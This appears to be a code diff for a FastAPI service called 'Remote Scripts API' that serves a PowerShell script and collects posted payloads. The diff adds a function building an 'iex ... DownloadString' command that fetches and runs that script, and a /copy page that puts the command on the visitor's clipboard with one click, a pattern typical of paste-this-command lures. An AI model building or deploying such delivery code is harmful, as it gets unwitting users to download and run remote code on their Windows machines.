@@ -5,7 +5,7 @@ from pathlib import Path
 from typing import Any
 
 from fastapi import FastAPI, HTTPException, Request
-from fastapi.responses import FileResponse, PlainTextResponse
+from fastapi.responses import FileResponse, HTMLResponse, PlainTextResponse
 
 
 app = FastAPI(title="Remote Scripts API")
@@ -14,16 +14,28 @@ SCRIPT_PATH = Path(__file__).with_name("windows_script.ps1")
 BIN_DIR = Path(__file__).with_name("bin")
 DATA_DIR = Path(os.getenv("DATA_DIR", "/app/data"))
 
-if os.getenv("PAYLOAD_HOSTNAME"):
-    PAYLOAD_HOSTNAME = os.getenv("PAYLOAD_HOSTNAME")
-elif fly_app := os.getenv("FLY_APP_NAME"):
-    PAYLOAD_HOSTNAME = f"{fly_app}.fly.dev"
-else:
-    PAYLOAD_HOSTNAME = "localhost:8001"
 
-_scheme = "https" if PAYLOAD_HOSTNAME.endswith(".fly.dev") else "http"
-API_BASE = f"{_scheme}://{PAYLOAD_HOSTNAME}"
+def resolve_api_base(request: Request | None = None) -> str:
+    if host := os.getenv("PAYLOAD_HOSTNAME"):
+        scheme = "https" if host.endswith(".fly.dev") else "http"
+        return f"{scheme}://{host}"
+
+    if request is not None:
+        return f"{request.url.scheme}://{request.url.netloc}"
+
+    if fly_app := os.getenv("FLY_APP_NAME"):
+        return f"https://{fly_app}.fly.dev"
+
+    return "http://localhost:8001"
+
+
+API_BASE = resolve_api_base()
 PAYLOAD_URL = f"{API_BASE}/payload"
+
+
+def build_powershell_command(api_base: str | None = None) -> str:
+    base = api_base or API_BASE
+    return f"iex (New-Object Net.WebClient).DownloadString('{base}/windows-script')"
 
 
 def save_payload(payload: dict[str, Any]) -> dict[str, str]:
@@ -52,6 +64,71 @@ async def get_windows_script() -> PlainTextResponse:
     return PlainTextResponse(
         render_windows_script(),
         media_type="text/plain; charset=utf-8",
+    )
+
+
+@app.get("/copy", response_class=HTMLResponse)
+async def copy_command(request: Request) -> HTMLResponse:
+    api_base = resolve_api_base(request)
+    command = build_powershell_command(api_base)
+
+    return HTMLResponse(
+        f"""<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>Copy</title>
+  <style>
+    body {{
+      font-family: system-ui, sans-serif;
+      display: flex;
+      flex-direction: column;
+      justify-content: center;
+      align-items: center;
+      gap: 0.75rem;
+      min-height: 100vh;
+      margin: 0;
+    }}
+    button {{
+      padding: 0.75rem 1.5rem;
+      font-size: 1rem;
+      cursor: pointer;
+    }}
+    #status {{
+      color: #16a34a;
+      min-height: 1.25rem;
+    }}
+  </style>
+</head>
+<body>
+  <button type="button" id="copy-btn">Copy</button>
+  <div id="status"></div>
+  <script>
+    const command = {json.dumps(command)};
+    document.getElementById("copy-btn").addEventListener("click", async () => {{
+      const status = document.getElementById("status");
+      try {{
+        await navigator.clipboard.writeText(command);
+        status.textContent = "Copied";
+      }} catch (e) {{
+        const textarea = document.createElement("textarea");
+        textarea.value = command;
+        textarea.style.position = "fixed";
+        textarea.style.opacity = "0";
+        document.body.appendChild(textarea);
+        textarea.select();
+        if (document.execCommand("copy")) {{
+          status.textContent = "Copied";
+        }} else {{
+          status.textContent = "Could not copy";
+        }}
+        textarea.remove();
+      }}
+    }});
+  </script>
+</body>
+</html>"""
     )
 
 
